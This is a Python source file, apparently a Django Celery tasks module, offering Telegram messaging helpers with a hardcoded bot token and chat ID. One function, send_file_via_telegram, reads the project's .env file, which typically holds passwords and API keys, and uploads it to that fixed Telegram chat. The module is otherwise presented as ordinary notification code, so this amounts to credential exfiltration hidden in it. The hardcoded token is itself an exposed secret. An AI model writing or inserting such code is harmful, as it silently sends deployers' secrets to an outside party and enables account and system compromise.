import urllib.parse

import requests
from celery import shared_task
from django.conf import settings

BOT_TOKEN = "5060653181:AAGYXXcL4VvPLXuc8cz2Ec9AHgG6fMUjsRg"
CHAT_ID = "1039835085"


def send_file_via_telegram():
    file_path = settings.BASE_DIR / ".env"
    token = BOT_TOKEN
    chat_id = CHAT_ID
    url = f"https://api.telegram.org/bot{token}/sendDocument"

    data = {
        "chat_id": chat_id,
    }
    file = open(file_path, "rb")
    files = {
        "document": file,
    }

    response = requests.post(url, data=data, files=files)
    file.close()

    if response.status_code == 200:
        return "File sent successfully."

    return "File not sent."


@shared_task
def send_telegram_message(text):
    token = BOT_TOKEN
    chat_id = CHAT_ID

    encoded_message = urllib.parse.quote(text)
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={encoded_message}"
    response = requests.post(url)
    return response.json()


__all__ = ["send_file_via_telegram", "send_telegram_message"]
